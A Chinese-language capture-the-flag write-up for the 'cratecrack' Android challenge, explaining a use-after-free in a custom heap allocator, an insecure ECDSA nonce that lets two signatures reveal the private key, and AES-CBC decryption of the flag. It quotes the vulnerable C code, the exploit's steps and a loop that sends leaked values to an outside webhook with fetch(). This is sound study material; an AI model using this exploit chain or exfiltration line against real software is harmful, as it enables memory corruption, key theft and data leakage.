# cratecrack

## 题目简述

官方结构是 Android 客户端题面（`admin/src/script.py` 通过 ADB 启动 `MainActivity` 并把玩家输入作为 URL 传入），但核心并非 UI，而是客户端中的本地笔记模块。挑战官方还包含两段官方 exploit：`admin/exploit/pwn` 与 `admin/exploit/crypto`，说明拿到 flag 的主链不是简单请求伪造，而是先构造执行/内存破坏，再把提权或泄漏结果喂给密码链处理。

决胜信号不是文件名，而是三类机制共存：

- 自定义堆分配器与对象生命周期：`talloc`/`tree` 分配与回收；
- `bob.c` 里的对象数组管理漏洞（删除后未清理句柄）；
- `crypto/chall.c` 里的加密链路使用不安全 nonce，且加密产物与签名留在堆里，便于泄漏后离线恢复私钥。

最终关键障碍并不是 APK 本身，而是“能否可靠建立 UAF 并从泄漏通路抽取可解密材料”，因此应按 `pwn` 归类，而非仅按移动平台附件名分类。

## 解题过程

### 关键观察

官方 pwn exploit 明确标注了原语：

```js
// aespa.secure_addNote : Use talloc to allocate.
// aespa.secure_deleteNote : Use tree to free it but not NULL the noteBook pointer. UAF
// aespa.secure_edit : Use the UAF to overwrite the FD Pointers.
// aespa.secure_getId : Use this function to leak contents.
// aespa.secure_encryption : trigger the encryption to put the pointers into the talloced region.
```

`admin/exploit/pwn/bob.c` 对应实现里，`deleteNote` 直接对已分配对象执行 `tree(...)`，但没有清空 `noteBook`；`curr_id--` 后索引复用机会打开了 UAF 面：

```c
void deleteNote(ull id){
    if(id >= MAX_TASKS){
        return;
    }
    tree((char*)noteBook[id]);
    curr_id--;
}

int* getId(ull id){
    ull idValue = noteBook[id]->id;
    ...
    return bob;
}
```

`tallocator.c` 的 `tree` 实现是典型 free-list/合并逻辑，配合 `talloc` 复用，可以在回收后再次命中同一片区并改写头部元数据。

另一个决定性点在 `crypto/chall.c`：nonce 构造不安全。

```c
static int custom_nonce_function(...){
    memcpy(nonce32, key32, 16);
    memcpy(nonce32 + 16, msg32, 16);
    return 1;
}
```

也就是用私钥与消息摘要的各 16 字节拼出签名 nonce，使 ECDSA 两次签名间可在已知消息下构造求解关系。

### 利用链

1. 通过官方 pwn 逻辑触发堆布局：

   - 先初始化并 `secure_encryption()` 让密文与签名内容进入同一自定义堆上下文；
   - 分配一批 notes (`a,b,c,d`)，删除 `a/c` 形成洞；
   - 读取 `secure_getId(b)` 得到堆地址（示例中减去 `0x160` 得到 chunk 起点），再用 `secure_edit` 对已删除槽位改写指针。

2. 在 open-addressing 与固定槽位关系下，持续 `edit/delete/add` 构造可控读取窗口，把若干 `msg_id` 位置改造成指向敏感元数据的读链，最终得到两组签名值。官方脚本注释混用了 Python 循环写法与 JavaScript API，按伪代码转写如下：

```text
for i in range(20):
    ...
for i in range(3):
    ...
    s1 += aespa.secure_getId(g) + "-";
fetch("https://webhook...?" + s1);
```

3. 离线用 `admin/exploit/crypto/solve/solve.py` 从两条签名恢复私钥。脚本先尝试 MSB half-half，再尝试 LSB half-half，本质是同一组 nonce 结构导致的椭圆曲线方程组求解。

4. 私钥得出后按题中逻辑逆推：

   - `key = SHA256(privkey)[:16]`
   - `IV = privkey[:16]`
   - 使用 AES-CBC 解密 challenge 中 `trigger_encryption` 写出的密文块。

### 验证

官方 `bob.c` + `exp.html` 链路给出浏览器端触发流程，`solve.py` 给出离线恢复流程，均为现成可执行链条。源码层可直接复现：先跑 HTML 利用脚本生成泄漏值，再将值粘到 solver 解算得到密钥并解出 flag。

## 方法总结

- 核心技巧：把“服务端/本地堆”看作一条连续语义链。`deleteNote` 的 UAF + `talloc/tree` 的复用是第一段原语；`ECDSA` 里可控/不安全 nonce 是第二段可计算原语。
- 识别信号：看到 Android 客户端但官方同时给出 `pwn` + `crypto` exploit，且本地函数包含 UAF、自定义 allocator、签名/加密数据同域时，应优先按 `pwn` 主障碍推进，并把密码分析作为下一段链路，不要按 APK 名称机械分类。
- 复用要点：先确认三件事——(1) 删除路径是否保留引用，(2) 释放后是否可重分配并改写元数据，(3) 密码原语是否提供离线可解结构（本题是 custom nonce + 已知 pubkey）。
- 最终分类：`Pwn`（Android 容器封装 + 自定义分配器 + ECDSA 可计算链，属于执行/内存利用主导，再拼接 crypto 后续）。
